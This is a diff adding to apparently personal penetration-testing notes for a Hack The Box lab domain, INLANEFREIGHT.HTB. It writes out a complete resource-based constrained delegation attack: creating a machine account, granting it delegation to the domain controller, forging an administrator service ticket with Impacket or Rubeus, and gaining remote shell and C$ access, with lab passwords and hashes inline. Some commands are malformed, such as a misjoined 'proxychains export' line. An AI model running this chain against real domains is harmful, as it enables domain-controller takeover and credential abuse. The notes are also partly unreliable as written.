@@ -386,7 +386,17 @@ proxychains nxc smb 172.16.130.3 -u 'elieser' -p 'newP@ssword2022'
 
 
 
-# gil 	Password28 	AddAllowedToAct 	DC01
-
+# gil 	Password28 	AddAllowedToAct 	DC01 (rbcd)
+proxychains bloodyAD --host 172.16.130.3 -d INLANEFREIGHT.HTB -u pedro -p Password17 add computer "comp" 'p@ssword123!'
+proxychains bloodyAD --host 172.16.130.3 -d INLANEFREIGHT.HTB -u gil -p Password28 add rbcd 'DC01$' 'comp$'
+proxychains impacket-getST -spn 'cifs/DC01' -impersonate 'administrator' 'INLANEFREIGHT.HTB/'comp'':'p@ssword123!'
+proxychains export KRB5CCNAME=administrator@cifs_WS01@INLANEFREIGHT.HTB.ccache impacket-wmiexec WS01.INLANEFREIGHT.HTB -k -no-pass
+или
+./Rubeus.exe hash /password:'p@ssword123!'
+7DDB26CB86B15AF2EB6566C079260417
+7DDB26CB86B15AF2EB6566C079260417
+./Rubeus.exe s4u /user:comp$ /rc4:7DDB26CB86B15AF2EB6566C079260417 /impersonateuser:administrator /msdsspn:cifs/DC01.INLANEFREIGHT.HTB /ptt
+Enter-PSSession DC01.INLANEFREIGHT.HTB
+net use S: \\DC01.inlanefreight.htb\C$ /persistent:yes
 
 
